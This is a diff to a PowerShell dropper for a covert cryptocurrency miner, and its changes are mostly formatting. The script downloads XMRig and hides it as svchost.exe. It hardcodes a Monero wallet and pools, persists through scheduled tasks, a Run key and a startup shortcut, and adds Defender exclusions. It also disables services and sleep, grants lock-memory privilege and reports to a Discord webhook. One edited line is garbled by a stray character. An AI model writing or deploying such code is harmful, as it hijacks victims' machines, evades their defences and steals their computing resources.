@@ -7,24 +7,24 @@
 # ============================================================
 
 # ==================== CONFIG ====================
-$wallet         = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
-$pool           = "pool.hashvault.pro:443"
-$poolBak        = "pool.supportxmr.com:443"
-$idleCpu        = 100
-$activeCpu      = 30
-$idleThreshold  = 120
+$wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
+$pool = "pool.hashvault.pro:443"
+$poolBak = "pool.supportxmr.com:443"
+$idleCpu = 100
+$activeCpu = 30
+$idleThreshold = 120
 
-$installDir     = "$env:APPDATA\WindowsServices"
-$xmrigExe       = "$installDir\svchost.exe"
-$configFile     = "$installDir\config.json"
-$watchdogPs1    = "$installDir\watchdog.ps1"
-$watchdogVbs    = "$installDir\monitor.vbs"
-$xmrigUrl       = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
-$zipFile        = "$env:TEMP\winsvc.zip"
-$extractDir     = "$env:TEMP\winsvc_extract"
-$xmrigApiPort   = 45580
-$rigId          = "$env:COMPUTERNAME"
-$worker         = "$env:COMPUTERNAME"
+$installDir = "$env:APPDATA\WindowsServices"
+$xmrigExe = "$installDir\svchost.exe"
+$configFile = "$installDir\config.json"
+$watchdogPs1 = "$installDir\watchdog.ps1"
+$watchdogVbs = "$installDir\monitor.vbs"
+$xmrigUrl = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
+$zipFile = "$env:TEMP\winsvc.zip"
+$extractDir = "$env:TEMP\winsvc_extract"
+$xmrigApiPort = 45580
+$rigId = "$env:COMPUTERNAME"
+$worker = "$env:COMPUTERNAME"
 
 # ==================== FUNCTIONS ====================
 
@@ -36,7 +36,8 @@ function Install-Miner {
             ($_.CommandLine -like "*$watchdogVbs*") -or 
             ($_.CommandLine -like "*$watchdogPs1*")
         } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-    } catch {}
+    }
+    catch {}
     
     Start-Sleep -Seconds 2
     New-Item -ItemType Directory -Path $installDir -Force | Out-Null
@@ -47,7 +48,8 @@ function Install-Miner {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("User-Agent", "Mozilla/5.0")
         $wc.DownloadFile($xmrigUrl, $zipFile); $downloaded = $true
-    } catch {
+    }
+    catch {
         try { Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop; $downloaded = $true } catch {}
     }
 
@@ -159,7 +161,8 @@ function Set-Persistence {
         $trig = New-ScheduledTaskTrigger -AtLogon
         Register-ScheduledTask -TaskName $taskName -Action $a1 -Trigger $trig -RunLevel Highest -Force | Out-Null
         Register-ScheduledTask -TaskName $wdTask -Action $a2 -Trigger $trig -RunLevel Highest -Force | Out-Null
-    } catch {}
+    }
+    catch {}
 
     $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     Set-ItemProperty $reg "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force
@@ -169,8 +172,9 @@ function Set-Persistence {
     try {
         $ws = New-Object -ComObject WScript.Shell
         $sc = $ws.CreateShortcut("$start\ServiceMonitor.lnk")
-        $sc.TargetPath = "wscript.exe"; $sc.Arguments = "`"$watchdogVbs`""; $sc.WindowStyle = 7; $sc.Save()
-    } catch {}
+        $sc.TargetPath = "wscript.exe"; $sc.Arguments = "`"$watchdogVbs`心; $sc.WindowStyle = 7; $sc.Save()
+    }
+    catch {}
 }
 
 function Lockdown-System {
@@ -181,7 +185,8 @@ function Lockdown-System {
             Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
             Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
         }
-    } catch {}
+    }
+    catch {}
 }
 
 function Enable-HugePages {
@@ -192,11 +197,13 @@ function Enable-HugePages {
         $content = Get-Content $tmpCfg -Raw
         if ($content -match 'SeLockMemoryPrivilege\s*=\s*(.*)') {
             if ($Matches[1] -notlike "*$sid*") { $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid" }
-        } else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
+        }
+        else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
         Set-Content $tmpCfg $content -Force
         secedit /configure /db $tmpDb /cfg $tmpCfg /quiet 2>$null
         Remove-Item $tmpCfg, $tmpDb -Force -ErrorAction SilentlyContinue
-    } catch {}
+    }
+    catch {}
 }
 
 function Disable-Sleep {
@@ -204,7 +211,8 @@ function Disable-Sleep {
         powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c 2>$null
         powercfg /change standby-timeout-ac 0; powercfg /change standby-timeout-dc 0
         powercfg /change hibernate-timeout-ac 0; powercfg /change hibernate-timeout-dc 0; powercfg /hibernate off 2>$null
-    } catch {}
+    }
+    catch {}
 }
 
 function Send-DiscordWebhook {
@@ -221,7 +229,8 @@ function Send-DiscordWebhook {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("Content-Type", "application/json")
         $wc.UploadData($webhookUrl, "POST", [System.Text.Encoding]::UTF8.GetBytes($json)) | Out-Null
-    } catch {}
+    }
+    catch {}
 }
 
 # ==================== MAIN ====================
@@ -230,7 +239,8 @@ try {
     try {
         Get-ScheduledTask -TaskName "WindowsService*" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
         Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $xmrigExe } | Stop-Process -Force -ErrorAction SilentlyContinue
-    } catch {}
+    }
+    catch {}
 
     try { Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue } catch {}
     Lockdown-System
@@ -241,5 +251,5 @@ try {
     Start-Process "wscript.exe" -ArgumentList "`"$watchdogVbs`"" -WindowStyle Hidden
     Send-DiscordWebhook
     Write-Host "[+] Pro Deploy Success."
-} catch { Write-Host "[-] Error: $_" }
-    
+}
+catch { Write-Host "[-] Error: $_" }
